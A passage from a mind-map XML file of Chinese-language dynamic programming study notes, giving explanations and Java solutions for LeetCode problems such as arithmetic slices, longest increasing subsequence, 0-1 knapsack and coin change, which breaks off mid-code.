<node ID="ID_1909163302" CREATED="1754751539703" MODIFIED="1754751539704"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 数组中等差递增子区间的个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      413. Arithmetic Slices (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/arithmetic-slices/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/arithmetic-slices/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">A = [0, 1, 2, 3, 4]
return: 6, for 3 arithmetic slices in A:
[0, 1, 2],
[1, 2, 3],
[0, 1, 2, 3],
[0, 1, 2, 3, 4],
[ 1, 2, 3, 4],
[2, 3, 4]</code></pre>
    <p>
      dp[i] 表示以 A[i] 为结尾的等差递增子区间的个数。
    </p>
    <p>
      当 A[i] - A[i-1] == A[i-1] - A[i-2]，那么 [A[i-2], A[i-1], A[i]] 构成一个等差递增子区间。而且在以 A[i-1] 为结尾的递增子区间的后面再加上一个 A[i]，一样可以构成新的递增子区间。
    </p>
    <pre><code class="language-plaintext">dp[2] = 1
    [0, 1, 2]
dp[3] = dp[2] + 1 = 2
    [0, 1, 2, 3], // [0, 1, 2] 之后加一个 3
    [1, 2, 3]     // 新的递增子区间
dp[4] = dp[3] + 1 = 3
    [0, 1, 2, 3, 4], // [0, 1, 2, 3] 之后加一个 4
    [1, 2, 3, 4],    // [1, 2, 3] 之后加一个 4
    [2, 3, 4]        // 新的递增子区间</code></pre>
    <p>
      综上，在 A[i] - A[i-1] == A[i-1] - A[i-2] 时，dp[i] = dp[i-1] + 1。
    </p>
    <p>
      因为递增子区间不一定以最后一个元素为结尾，可以是任意一个元素结尾，因此需要返回 dp 数组累加的结果。
    </p>
    <pre><code class="language-plaintext">public int numberOfArithmeticSlices(int[] A) {
    if (A == null || A.length == 0) {
        return 0;
    }
    int n = A.length;
    int[] dp = new int[n];
    for (int i = 2; i &lt; n; i++) {
        if (A[i] - A[i - 1] == A[i - 1] - A[i - 2]) {
            dp[i] = dp[i - 1] + 1;
        }
    }
    int total = 0;
    for (int cnt : dp) {
        total += cnt;
    }
    return total;
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_355461508" CREATED="1754751539705" MODIFIED="1754751539705"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分割整数
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_787107250" CREATED="1754751539706" MODIFIED="1754751539708"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 分割整数的最大乘积
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      343. Integer Break (Medim)
    </p>
    <p>
      <a href="https://leetcode.com/problems/integer-break/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/integer-break/description/">力扣</a>
    </p>
    <p>
      题目描述：For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4).
    </p>
    <pre><code class="language-plaintext">public int integerBreak(int n) {
    int[] dp = new int[n + 1];
    dp[1] = 1;
    for (int i = 2; i &lt;= n; i++) {
        for (int j = 1; j &lt;= i - 1; j++) {
            dp[i] = Math.max(dp[i], Math.max(j * dp[i - j], j * (i - j)));
        }
    }
    return dp[n];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1076410855" CREATED="1754751539708" MODIFIED="1754751539710"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 按平方数来分割整数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      279. Perfect Squares(Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/perfect-squares/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/perfect-squares/description/">力扣</a>
    </p>
    <p>
      题目描述：For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9.
    </p>
    <pre><code class="language-plaintext">public int numSquares(int n) {
    List&lt;Integer&gt; squareList = generateSquareList(n);
    int[] dp = new int[n + 1];
    for (int i = 1; i &lt;= n; i++) {
        int min = Integer.MAX_VALUE;
        for (int square : squareList) {
            if (square &gt; i) {
                break;
            }
            min = Math.min(min, dp[i - square] + 1);
        }
        dp[i] = min;
    }
    return dp[n];
}
private List&lt;Integer&gt; generateSquareList(int n) {
    List&lt;Integer&gt; squareList = new ArrayList&lt;&gt;();
    int diff = 3;
    int square = 1;
    while (square &lt;= n) {
        squareList.add(square);
        square += diff;
        diff += 2;
    }
    return squareList;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1799315406" CREATED="1754751539711" MODIFIED="1754751539712"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 分割整数构成字母字符串
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      91. Decode Ways (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/decode-ways/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/decode-ways/description/">力扣</a>
    </p>
    <p>
      题目描述：Given encoded message &quot;12&quot;, it could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12).
    </p>
    <pre><code class="language-plaintext">public int numDecodings(String s) {
    if (s == null || s.length() == 0) {
        return 0;
    }
    int n = s.length();
    int[] dp = new int[n + 1];
    dp[0] = 1;
    dp[1] = s.charAt(0) == '0' ? 0 : 1;
    for (int i = 2; i &lt;= n; i++) {
        int one = Integer.valueOf(s.substring(i - 1, i));
        if (one != 0) {
            dp[i] += dp[i - 1];
        }
        if (s.charAt(i - 2) == '0') {
            continue;
        }
        int two = Integer.valueOf(s.substring(i - 2, i));
        if (two &lt;= 26) {
            dp[i] += dp[i - 2];
        }
    }
    return dp[n];
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1417636211" CREATED="1754751539713" MODIFIED="1754751539714"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      最长递增子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      已知一个序列 {S<sub>1</sub>, S<sub>2</sub>,...,S<sub>n</sub>}，取出若干数组成新的序列 {S<sub>i1</sub>, S<sub>i2</sub>,..., S<sub>im</sub>}，其中 i1、i2 ... im 保持递增，即新序列中各个数仍然保持原数列中的先后顺序，称新序列为原序列的一个 <strong>子序列</strong>&#xa0;。
    </p>
    <p>
      如果在子序列中，当下标 ix &gt; iy 时，S<sub>ix</sub>&#xa0;&gt; S<sub>iy</sub>，称子序列为原序列的一个 <strong>递增子序列</strong>&#xa0;。
    </p>
    <p>
      定义一个数组 dp 存储最长递增子序列的长度，dp[n] 表示以 S<sub>n</sub>&#xa0;结尾的序列的最长递增子序列长度。对于一个递增子序列 {S<sub>i1</sub>, S<sub>i2</sub>,...,S<sub>im</sub>}，如果 im &lt; n 并且 S<sub>im</sub>&#xa0;&lt; S<sub>n</sub>，此时 {S<sub>i1</sub>, S<sub>i2</sub>,..., S<sub>im</sub>, S<sub>n</sub>} 为一个递增子序列，递增子序列的长度增加 1。满足上述条件的递增子序列中，长度最长的那个递增子序列就是要找的，在长度最长的递增子序列上加上 S<sub>n</sub>&#xa0;就构成了以 S<sub>n</sub>&#xa0;为结尾的最长递增子序列。因此 dp[n] = max{ dp[i]+1 | S<sub>i</sub>&#xa0;&lt; S<sub>n</sub>&#xa0;&amp;&amp; i &lt; n} 。
    </p>
    <p>
      因为在求 dp[n] 时可能无法找到一个满足条件的递增子序列，此时 {S<sub>n</sub>} 就构成了递增子序列，需要对前面的求解方程做修改，令 dp[n] 最小为 1，即：
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ee994da4-0fc7-443d-ac56-c08caf00a204.jpg"/>
      
    </p>
    <p>
      对于一个长度为 N 的序列，最长递增子序列并不一定会以 S<sub>N</sub>&#xa0;为结尾，因此 dp[N] 不是序列的最长递增子序列的长度，需要遍历 dp 数组找出最大值才是所要的结果，max{ dp[i] | 1 &lt;= i &lt;= N} 即为所求。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1812746391" CREATED="1754751539715" MODIFIED="1754751539717"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 最长递增子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      300. Longest Increasing Subsequence (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-increasing-subsequence/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-increasing-subsequence/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public int lengthOfLIS(int[] nums) {
    int n = nums.length;
    int[] dp = new int[n];
    for (int i = 0; i &lt; n; i++) {
        int max = 1;
        for (int j = 0; j &lt; i; j++) {
            if (nums[i] &gt; nums[j]) {
                max = Math.max(max, dp[j] + 1);
            }
        }
        dp[i] = max;
    }
    return Arrays.stream(dp).max().orElse(0);
}</code></pre>
    <p>
      使用 Stream 求最大值会导致运行时间过长，可以改成以下形式：
    </p>
    <pre><code class="language-plaintext">int ret = 0;
for (int i = 0; i &lt; n; i++) {
    ret = Math.max(ret, dp[i]);
}
return ret;</code></pre>
    <p>
      以上解法的时间复杂度为 O(N<sup>2</sup>)，可以使用二分查找将时间复杂度降低为 O(NlogN)。
    </p>
    <p>
      定义一个 tails 数组，其中 tails[i] 存储长度为 i + 1 的最长递增子序列的最后一个元素。对于一个元素 x，
    </p>
    <ul>
      <li>
        <p>
          如果它大于 tails 数组所有的值，那么把它添加到 tails 后面，表示最长递增子序列长度加 1；
        </p>
      </li>
      <li>
        <p>
          如果 tails[i-1] \&lt; x \&lt;= tails[i]，那么更新 tails[i] = x。
        </p>
      </li>
    </ul>
    <p>
      例如对于数组 [4,3,6,5]，有：
    </p>
    <pre><code class="language-plaintext">tails      len      num
[]         0        4
[4]        1        3
[3]        1        6
[3,6]      2        5
[3,5]      2        null</code></pre>
    <p>
      可以看出 tails 数组保持有序，因此在查找 S<sub>i</sub>&#xa0;位于 tails 数组的位置时就可以使用二分查找。
    </p>
    <pre><code class="language-plaintext">public int lengthOfLIS(int[] nums) {
    int n = nums.length;
    int[] tails = new int[n];
    int len = 0;
    for (int num : nums) {
        int index = binarySearch(tails, len, num);
        tails[index] = num;
        if (index == len) {
            len++;
        }
    }
    return len;
}
private int binarySearch(int[] tails, int len, int key) {
    int l = 0, h = len;
    while (l &lt; h) {
        int mid = l + (h - l) / 2;
        if (tails[mid] == key) {
            return mid;
        } else if (tails[mid] &gt; key) {
            h = mid;
        } else {
            l = mid + 1;
        }
    }
    return l;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_334257625" CREATED="1754751539717" MODIFIED="1754751539719"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 一组整数对能够构成的最长链
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      646. Maximum Length of Pair Chain (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/maximum-length-of-pair-chain/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/maximum-length-of-pair-chain/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [[1,2], [2,3], [3,4]]
Output: 2
Explanation: The longest chain is [1,2] -&gt; [3,4]</code></pre>
    <p>
      题目描述：对于 (a, b) 和 (c, d) ，如果 b \&lt; c，则它们可以构成一条链。
    </p>
    <pre><code class="language-plaintext">public int findLongestChain(int[][] pairs) {
    if (pairs == null || pairs.length == 0) {
        return 0;
    }
    Arrays.sort(pairs, (a, b) -&gt; (a[0] - b[0]));
    int n = pairs.length;
    int[] dp = new int[n];
    Arrays.fill(dp, 1);
    for (int i = 1; i &lt; n; i++) {
        for (int j = 0; j &lt; i; j++) {
            if (pairs[j][1] &lt; pairs[i][0]) {
                dp[i] = Math.max(dp[i], dp[j] + 1);
            }
        }
    }
    return Arrays.stream(dp).max().orElse(0);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1945118668" CREATED="1754751539719" MODIFIED="1754751539722"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 最长摆动子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      376. Wiggle Subsequence (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/wiggle-subsequence/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/wiggle-subsequence/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [1,7,4,9,2,5]
Output: 6
The entire sequence is a wiggle sequence.
Input: [1,17,5,10,13,15,10,5,16,8]
Output: 7
There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8].
Input: [1,2,3,4,5,6,7,8,9]
Output: 2</code></pre>
    <p>
      要求：使用 O(N) 时间复杂度求解。
    </p>
    <pre><code class="language-plaintext">public int wiggleMaxLength(int[] nums) {
    if (nums == null || nums.length == 0) {
        return 0;
    }
    int up = 1, down = 1;
    for (int i = 1; i &lt; nums.length; i++) {
        if (nums[i] &gt; nums[i - 1]) {
            up = down + 1;
        } else if (nums[i] &lt; nums[i - 1]) {
            down = up + 1;
        }
    }
    return Math.max(up, down);
}</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_237599931" CREATED="1754751539722" MODIFIED="1754751539724"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      最长公共子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      对于两个子序列 S1 和 S2，找出它们最长的公共子序列。
    </p>
    <p>
      定义一个二维数组 dp 用来存储最长公共子序列的长度，其中 dp[i][j] 表示 S1 的前 i 个字符与 S2 的前 j 个字符最长公共子序列的长度。考虑 S1<sub>i</sub>&#xa0;与 S2<sub>j</sub>&#xa0;值是否相等，分为两种情况：
    </p>
    <ul>
      <li>
        <p>
          当 S1<sub>i</sub>==S2<sub>j</sub>&#xa0;时，那么就能在 S1 的前 i-1 个字符与 S2 的前 j-1 个字符最长公共子序列的基础上再加上 S1<sub>i</sub>&#xa0;这个值，最长公共子序列长度加 1，即 dp[i][j] = dp[i-1][j-1] + 1。
        </p>
      </li>
      <li>
        <p>
          当 S1<sub>i</sub>&#xa0;!= S2<sub>j</sub>&#xa0;时，此时最长公共子序列为 S1 的前 i-1 个字符和 S2 的前 j 个字符最长公共子序列，或者 S1 的前 i 个字符和 S2 的前 j-1 个字符最长公共子序列，取它们的最大者，即 dp[i][j] = max{ dp[i-1][j], dp[i][j-1] }。
        </p>
      </li>
    </ul>
    <p>
      综上，最长公共子序列的状态转移方程为：
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ecd89a22-c075-4716-8423-e0ba89230e9a.jpg"/>
      
    </p>
    <p>
      对于长度为 N 的序列 S<sub>1</sub>&#xa0;和长度为 M 的序列 S<sub>2</sub>，dp[N][M] 就是序列 S<sub>1</sub>&#xa0;和序列 S<sub>2</sub>&#xa0;的最长公共子序列长度。
    </p>
    <p>
      与最长递增子序列相比，最长公共子序列有以下不同点：
    </p>
    <ul>
      <li>
        <p>
          针对的是两个序列，求它们的最长公共子序列。
        </p>
      </li>
      <li>
        <p>
          在最长递增子序列中，dp[i] 表示以 S<sub>i</sub>&#xa0;为结尾的最长递增子序列长度，子序列必须包含 S<sub>i</sub>&#xa0;；在最长公共子序列中，dp[i][j] 表示 S1 中前 i 个字符与 S2 中前 j 个字符的最长公共子序列长度，不一定包含 S1<sub>i</sub>&#xa0;和 S2<sub>j</sub>。
        </p>
      </li>
      <li>
        <p>
          在求最终解时，最长公共子序列中 dp[N][M] 就是最终解，而最长递增子序列中 dp[N] 不是最终解，因为以 S<sub>N</sub>&#xa0;为结尾的最长递增子序列不一定是整个序列最长递增子序列，需要遍历一遍 dp 数组找到最大者。
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1037761186" CREATED="1754751539724" MODIFIED="1754751539726"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 最长公共子序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      1143. Longest Common Subsequence
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-common-subsequence/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-common-subsequence/">力扣</a>
    </p>
    <pre><code class="language-plaintext">public int longestCommonSubsequence(String text1, String text2) {
        int n1 = text1.length(), n2 = text2.length();
        int[][] dp = new int[n1 + 1][n2 + 1];
        for (int i = 1; i &lt;= n1; i++) {
            for (int j = 1; j &lt;= n2; j++) {
                if (text1.charAt(i - 1) == text2.charAt(j - 1)) {
                    dp[i][j] = dp[i - 1][j - 1] + 1;
                } else {
                    dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]);
                }
            }
        }
        return dp[n1][n2];
    }</code></pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_799198414" CREATED="1754751539726" MODIFIED="1754751539729"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      0-1 背包
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      有一个容量为 N 的背包，要用这个背包装下物品的价值最大，这些物品有两个属性：体积 w 和价值 v。
    </p>
    <p>
      定义一个二维数组 dp 存储最大价值，其中 dp[i][j] 表示前 i 件物品体积不超过 j 的情况下能达到的最大价值。设第 i 件物品体积为 w，价值为 v，根据第 i 件物品是否添加到背包中，可以分两种情况讨论：
    </p>
    <ul>
      <li>
        <p>
          第 i 件物品没添加到背包，总体积不超过 j 的前 i 件物品的最大价值就是总体积不超过 j 的前 i-1 件物品的最大价值，dp[i][j] = dp[i-1][j]。
        </p>
      </li>
      <li>
        <p>
          第 i 件物品添加到背包中，dp[i][j] = dp[i-1][j-w] + v。
        </p>
      </li>
    </ul>
    <p>
      第 i 件物品可添加也可以不添加，取决于哪种情况下最大价值更大。因此，0-1 背包的状态转移方程为：
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8cb2be66-3d47-41ba-b55b-319fc68940d4.png"/>
      
    </p>
    <pre><code class="language-plaintext">// W 为背包总体积
// N 为物品数量
// weights 数组存储 N 个物品的重量
// values 数组存储 N 个物品的价值
public int knapsack(int W, int N, int[] weights, int[] values) {
    int[][] dp = new int[N + 1][W + 1];
    for (int i = 1; i &lt;= N; i++) {
        int w = weights[i - 1], v = values[i - 1];
        for (int j = 1; j &lt;= W; j++) {
            if (j &gt;= w) {
                dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - w] + v);
            } else {
                dp[i][j] = dp[i - 1][j];
            }
        }
    }
    return dp[N][W];
}</code></pre>
    <p>
      <strong>空间优化</strong>
    </p>
    <p>
      在程序实现时可以对 0-1 背包做优化。观察状态转移方程可以知道，前 i 件物品的状态仅与前 i-1 件物品的状态有关，因此可以将 dp 定义为一维数组，其中 dp[j] 既可以表示 dp[i-1][j] 也可以表示 dp[i][j]。此时，
    </p>
    <p>
      <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9ae89f16-7905-4a6f-88a2-874b4cac91f4.jpg"/>
      
    </p>
    <p>
      因为 dp[j-w] 表示 dp[i-1][j-w]，因此不能先求 dp[i][j-w]，防止将 dp[i-1][j-w] 覆盖。也就是说要先计算 dp[i][j] 再计算 dp[i][j-w]，在程序实现时需要按倒序来循环求解。
    </p>
    <pre><code class="language-plaintext">public int knapsack(int W, int N, int[] weights, int[] values) {
    int[] dp = new int[W + 1];
    for (int i = 1; i &lt;= N; i++) {
        int w = weights[i - 1], v = values[i - 1];
        for (int j = W; j &gt;= 1; j--) {
            if (j &gt;= w) {
                dp[j] = Math.max(dp[j], dp[j - w] + v);
            }
        }
    }
    return dp[W];
}</code></pre>
    <p>
      <strong>无法使用贪心算法的解释</strong>
    </p>
    <p>
      0-1 背包问题无法使用贪心算法来求解，也就是说不能按照先添加性价比最高的物品来达到最优，这是因为这种方式可能造成背包空间的浪费，从而无法达到最优。考虑下面的物品和一个容量为 5 的背包，如果先添加物品 0 再添加物品 1，那么只能存放的价值为 16，浪费了大小为 2 的空间。最优的方式是存放物品 1 和物品 2，价值为 22.
    </p>
    <table>
      <colgroup>
      <col/>
      <col/>
      <col/>
      <col/>
      </colgroup>
      

      <tr>
        <th colspan="1" rowspan="1">
          <p>
            id
          </p>
        </th>
        <th colspan="1" rowspan="1">
          <p>
            w
          </p>
        </th>
        <th colspan="1" rowspan="1">
          <p>
            v
          </p>
        </th>
        <th colspan="1" rowspan="1">
          <p>
            v/w
          </p>
        </th>
      </tr>
      <tr>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            0
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            1
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            6
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            6
          </p>
        </td>
      </tr>
      <tr>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            1
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            2
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            10
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            5
          </p>
        </td>
      </tr>
      <tr>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            2
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            3
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            12
          </p>
        </td>
        <td colspan="1" rowspan="1" draggable="true">
          <p>
            4
          </p>
        </td>
      </tr>
    </table>
    <p>
      <strong>变种</strong>
    </p>
    <ul>
      <li>
        <p>
          完全背包：物品数量为无限个
        </p>
      </li>
      <li>
        <p>
          多重背包：物品数量有限制
        </p>
      </li>
      <li>
        <p>
          多维费用背包：物品不仅有重量，还有体积，同时考虑这两种限制
        </p>
      </li>
      <li>
        <p>
          其它：物品之间相互约束或者依赖
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_52370593" CREATED="1754751539729" MODIFIED="1754751539731"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 划分数组为和相等的两部分
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      416. Partition Equal Subset Sum (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/partition-equal-subset-sum/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: [1, 5, 11, 5]
Output: true
Explanation: The array can be partitioned as [1, 5, 5] and [11].</code></pre>
    <p>
      可以看成一个背包大小为 sum/2 的 0-1 背包问题。
    </p>
    <pre><code class="language-plaintext">public boolean canPartition(int[] nums) {
    int sum = computeArraySum(nums);
    if (sum % 2 != 0) {
        return false;
    }
    int W = sum / 2;
    boolean[] dp = new boolean[W + 1];
    dp[0] = true;
    for (int num : nums) {                 // 0-1 背包一个物品只能用一次
        for (int i = W; i &gt;= num; i--) {   // 从后往前，先计算 dp[i] 再计算 dp[i-num]
            dp[i] = dp[i] || dp[i - num];
        }
    }
    return dp[W];
}
private int computeArraySum(int[] nums) {
    int sum = 0;
    for (int num : nums) {
        sum += num;
    }
    return sum;
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_380379244" CREATED="1754751539731" MODIFIED="1754751539733"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 改变一组数的正负号使得它们的和为一给定数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      494. Target Sum (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/target-sum/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/target-sum/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: nums is [1, 1, 1, 1, 1], S is 3.
Output: 5
Explanation:
-1+1+1+1+1 = 3
+1-1+1+1+1 = 3
+1+1-1+1+1 = 3
+1+1+1-1+1 = 3
+1+1+1+1-1 = 3
There are 5 ways to assign symbols to make the sum of nums be target 3.</code></pre>
    <p>
      该问题可以转换为 Subset Sum 问题，从而使用 0-1 背包的方法来求解。
    </p>
    <p>
      可以将这组数看成两部分，P 和 N，其中 P 使用正号，N 使用负号，有以下推导：
    </p>
    <pre><code class="language-plaintext">sum(P) - sum(N) = target
sum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N)
                       2 * sum(P) = target + sum(nums)</code></pre>
    <p>
      因此只要找到一个子集，令它们都取正号，并且和等于 (target + sum(nums))/2，就证明存在解。
    </p>
    <pre><code class="language-plaintext">public int findTargetSumWays(int[] nums, int S) {
    int sum = computeArraySum(nums);
    if (sum &lt; S || (sum + S) % 2 == 1) {
        return 0;
    }
    int W = (sum + S) / 2;
    int[] dp = new int[W + 1];
    dp[0] = 1;
    for (int num : nums) {
        for (int i = W; i &gt;= num; i--) {
            dp[i] = dp[i] + dp[i - num];
        }
    }
    return dp[W];
}
private int computeArraySum(int[] nums) {
    int sum = 0;
    for (int num : nums) {
        sum += num;
    }
    return sum;
}</code></pre>
    <p>
      DFS 解法：
    </p>
    <pre><code class="language-plaintext">public int findTargetSumWays(int[] nums, int S) {
    return findTargetSumWays(nums, 0, S);
}
private int findTargetSumWays(int[] nums, int start, int S) {
    if (start == nums.length) {
        return S == 0 ? 1 : 0;
    }
    return findTargetSumWays(nums, start + 1, S + nums[start])
            + findTargetSumWays(nums, start + 1, S - nums[start]);
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_742294446" CREATED="1754751539734" MODIFIED="1754751539735"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 01 字符构成最多的字符串
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      474. Ones and Zeroes (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/ones-and-zeroes/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/ones-and-zeroes/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Input: Array = {&quot;10&quot;, &quot;0001&quot;, &quot;111001&quot;, &quot;1&quot;, &quot;0&quot;}, m = 5, n = 3
Output: 4
Explanation: There are totally 4 strings can be formed by the using of 5 0s and 3 1s, which are &quot;10&quot;,&quot;0001&quot;,&quot;1&quot;,&quot;0&quot;</code></pre>
    <p>
      这是一个多维费用的 0-1 背包问题，有两个背包大小，0 的数量和 1 的数量。
    </p>
    <pre><code class="language-plaintext">public int findMaxForm(String[] strs, int m, int n) {
    if (strs == null || strs.length == 0) {
        return 0;
    }
    int[][] dp = new int[m + 1][n + 1];
    for (String s : strs) {    // 每个字符串只能用一次
        int ones = 0, zeros = 0;
        for (char c : s.toCharArray()) {
            if (c == '0') {
                zeros++;
            } else {
                ones++;
            }
        }
        for (int i = m; i &gt;= zeros; i--) {
            for (int j = n; j &gt;= ones; j--) {
                dp[i][j] = Math.max(dp[i][j], dp[i - zeros][j - ones] + 1);
            }
        }
    }
    return dp[m][n];
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_187313831" CREATED="1754751539736" MODIFIED="1754751539738"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 找零钱的最少硬币数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      322. Coin Change (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/coin-change/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/coin-change/description/">力扣</a>
    </p>
    <pre><code class="language-plaintext">Example 1:
coins = [1, 2, 5], amount = 11
return 3 (11 = 5 + 5 + 1)
Example 2:
coins = [2], amount = 3
return -1.</code></pre>
    <p>
      题目描述：给一些面额的硬币，要求用这些硬币来组成给定面额的钱数，并且使得硬币数量最少。硬币可以重复使用。
    </p>
    <ul>
      <li>
        <p>
          物品：硬币
        </p>
      </li>
      <li>
        <p>
          物品大小：面额
        </p>
      </li>
      <li>
        <p>
          物品价值：数量
        </p>
      </li>
    </ul>
    <p>
      因为硬币可以重复使用，因此这是一个完全背包问题。完全背包只需要将 0-1 背包的逆序遍历 dp 数组改为正序遍历即可。
    </p>
    <pre><code class="language-plaintext">public int coinChange(int[] coins, int amount) {
    if (amount == 0 || coins == null) return 0;
    int[] dp = new int[amount + 1];
    for (int coin : coins) {
        for (int i = coin; i &lt;= amount; i++) { //将逆序遍历改为正序遍历
            if (i == coin) {
                dp[i] = 1;
